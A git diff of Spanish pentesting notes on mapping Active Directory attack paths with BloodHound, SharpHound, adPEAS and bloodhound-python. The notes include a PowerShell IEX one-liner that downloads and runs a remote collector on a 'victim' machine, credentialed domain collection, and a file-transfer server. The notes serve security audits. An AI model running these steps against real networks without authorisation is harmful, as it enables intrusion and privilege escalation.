@@ -1,8 +1,35 @@
-# BloodHound 
+# Bloodhound 
 
-Tags: #AD #Powershell #Windows #Enumeracion #BloodHound 
+Tags: #AD #BloodHound #SharpHound #Kali #Parrot 
 
-Bloodhound es una app en JavaScript la cual puede identificar fácilmente ataques altamente complejo que de otro modo seria imposible identificar ademas puede identificar grupos con permisos excesivos. Los defensores pueden usar Bloohound para identificar y eliminar esas mismas rutas de ataque. 
+**BloodHound** es una herramienta especializada en analizar y mapear relaciones dentro de Active Directory (AD). Su capacidad para identificar rutas de ataque y relaciones complejas la ha convertido en una herramienta esencial tanto para pentesters como para atacantes. A través de la recopilación y visualización de datos, permite descubrir configuraciones inseguras, privilegios excesivos y posibles vectores de escalación de privilegios o movimiento lateral en entornos AD, lo que la hace invaluable en auditorías de seguridad y pruebas de penetración.
+
+* [BloodHound](https://github.com/SpecterOps/BloodHound-Legacy/releases)
+* [CustomQueries.json - BloodHound](https://github.com/CompassSecurity/BloodHoundQueries)
+* [Neo4j-installation](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/)
+
+```bash 
+❯ neo4j console                            # Iniciar neo4j por el puerto local '7474'
+❯ neo4j console &> /dev/null & disown      
+
+❯ BloodHound                               # Ejecutar Bloodhound 
+❯ BloodHound --no-sandbox & disown         
+
+Notas: 
+	1. La versión de Neo4j '4.4.26' funciona con Bloodhound '4.3.1' 
+	2. Si es la primera vez que se usa, abrir la web 'localhost:7474', agregar las credenciales 'neo4j:neo4j', despues, colocar una nueva passwd 'neo4j1' y conectarse al 'Bloodhound'
+	3. El 'CustomQueries.json' se descarga y se copia en la carpeta donde esta instalado 'BloodHound'
+```
+
+```bash 
+Identificar lo siguiente en BloodHound:
+	1. Identificación de 'Doman Admins'
+	2. Identificación de 'usuarios Kerberoasteables'
+	3. Identificación de 'usuarios AS-REP Roastable'
+	4. Identificación de vectores de ataque 'Find Shortest Paths to Domain Admins'
+	5. Identificación de 'Unsconstrained Delegation'
+	6. Identificación de usuarios con permisos sobre GPO 'Find if any domain user has interesting against aGPO'
+```
 
 ## SharpHound 
 
@@ -10,13 +37,17 @@ Bloodhound es una app en JavaScript la cual puede identificar fácilmente ataque
 * [SharpHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)
 
 ```powershell
-❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); 
+❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/SharpHound.ps1') 
+
 ❯ Invoke-BloodHound -CollectionMethod All     
 
-Nota: Estos comandos los ejecutamos en la maquina victima Windows para recolectar la información y obtener un archivo '.zip' el cual pasaremos a la herramienta de 'BloodHound' para el analisis 
+
+Notas: 
+	1. Si se ha instalado 'BloodHound' con 'apt' se debe de usar 'SharpHound.exe' que se encuentra en la ruta de instalacion del BloodHound para que se puedan cargar los datos 
+	2. Recolectar la información en la maquina victima Windows y obtener un archivo '.zip' para agregarlo a 'BloodHound'
 ```
 
-## ADPeas
+## ADPeas 
 
 * [ADPeas](https://github.com/61106960/adPEAS)
 
@@ -25,7 +56,8 @@ Nota: Estos comandos los ejecutamos en la maquina victima Windows para recolecta
 
 ❯ Invoke-adPEAS    # Módulo para hacer la enumeración automatizada
 
-Nota: Podemos usar ADPeas para hacer la recolección ya que automaticamente ejecuta 'SharpHound'
+Notas: 
+	1. Al usar ADPeas para hacer la recolección ejecuta 'SharpHound' automaticamente
 ```
 
 ## Subir Data por Python a BloodHound
@@ -33,7 +65,8 @@ Nota: Podemos usar ADPeas para hacer la recolección ya que automaticamente ejec
 ```bash
 ❯ bloodhound-python -d Domain.local -u User -p Password -ns IP_DC -c all   # Ejecutamos para recopilar la data y asi poder subir el archivo a la plataforma de Bloodhound
 
-Nota: Importamos todos los archivos que fueron generados en formato 'Json'
+Notas: 
+	1. Importamos todos los archivos que fueron generados en formato 'Json'
 ```
 
 ## SharpHound con credenciales Validas desde un CMD en Windows 
@@ -48,34 +81,6 @@ Nota: Importamos todos los archivos que fueron generados en formato 'Json'
 Nota: La herramienta regresará un archivo '.zip' que se debe cargar en 'BloodHound' para analizar
 
 ❯ python3 -m http.server 80     # Crear un recurso compartido a nivel de red para pasar archivos 
-```
-
-## BloodHound 
-
-* [BloodHound](https://github.com/SpecterOps/BloodHound-Legacy/releases)
-* [CustomQueries.json - BloodHound](https://github.com/CompassSecurity/BloodHoundQueries)
-* [Neo4j-installation](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/)
-
-```bash 
-❯ sudo neo4j console &> /dev/null & disown      # Iniciamos el servicio en el puerto local '7474' y lo independizamos
-
-❯ ./BloodHound --no-sandbox & disown            # Ejecutar como usuario 'root' 
-❯ bloodhound &> /dev/null & disown              # Ejecutar 'Bloodhound' e independizarlo
-
-Notas: 
-	1. Si es la primera vez que se usa, abrir la web 'localhost:7474', agregar las credenciales 'neo4j:neo4j', despues, colocar una nueva passwd y conectarse al 'Bloodhound'
-	2. El 'CustomQueries.json' se descarga y se copia en la carpeta donde esta instalado 'BloodHound'
-```
-
-```bash 
-Identificar lo siguiente en BloodHound:
-	1. Identificación de 'Doman Admins'
-	2. Identificación de 'usuarios Kerberoasteables'
-	3. Identificación de 'usuarios AS-REP Roastable'
-	4. Identificación de vectores de ataque 'Find Shortest Paths to Domain Admins'
-	5. Identificación de 'Unsconstrained Delegation'
-	6. Identificación de usuarios con permisos sobre GPO 'Find if any domain user has interesting against aGPO'
-	7. 
 ```
 
 ## Ataques 'DCSync'
